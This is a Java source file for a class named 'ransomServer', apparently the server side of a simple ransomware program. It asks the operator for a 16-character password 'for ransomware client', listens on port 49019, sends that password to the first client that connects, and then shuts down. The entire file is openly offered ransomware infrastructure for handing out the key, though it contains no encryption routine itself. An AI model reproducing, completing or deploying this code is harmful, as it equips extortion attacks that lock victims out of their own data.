
import java.io.*;
import java.net.*;
import java.util.*;
import java.security.*;
import javax.crypto.*;

public class ransomServer extends Thread
{
    public static void main(String[] args) 
    {
        int serverPort = 49019;
        ServerSocket serverSocket = null;
        String password = null;
        int x = 0;
        boolean correctInput = false;
        while (correctInput == false)
        {
            Scanner reader = new Scanner(System.in);
            System.out.println("Enter 16 character password for ransomware client when connect");
            password = reader.nextLine();
            if(password.length() != 16)
                System.out.println("Password was not 16 characters long");
            else
                correctInput = true;
        }

        try {
            String clientRequest;
            serverSocket = new ServerSocket(serverPort);
            System.out.println("SERVER accepting connections");
            while (true) {

                Socket clientConnectionSocket = serverSocket.accept();
                System.out.println("SERVER accepted connection");
                // This is regarding the server state of the connection

                while (clientConnectionSocket.isConnected() && !clientConnectionSocket.isClosed() && x < 1) {
                    BufferedReader inFromClient = new BufferedReader(new InputStreamReader(clientConnectionSocket.getInputStream()));
                    DataOutputStream outToClient = new DataOutputStream(clientConnectionSocket.getOutputStream());

                    outToClient.writeBytes(password + "\n");
                    outToClient.flush();
                    System.out.println("Password sent");

                    x++;
                }
                serverSocket.close();
                System.out.println("Server Terminated");
                break;
            }
        } catch (Exception e) {
            e.printStackTrace();
            if (serverSocket != null) {
                try {
                    serverSocket.close();
                } catch (IOException ioe) {

                }
            }
        }
    }
}
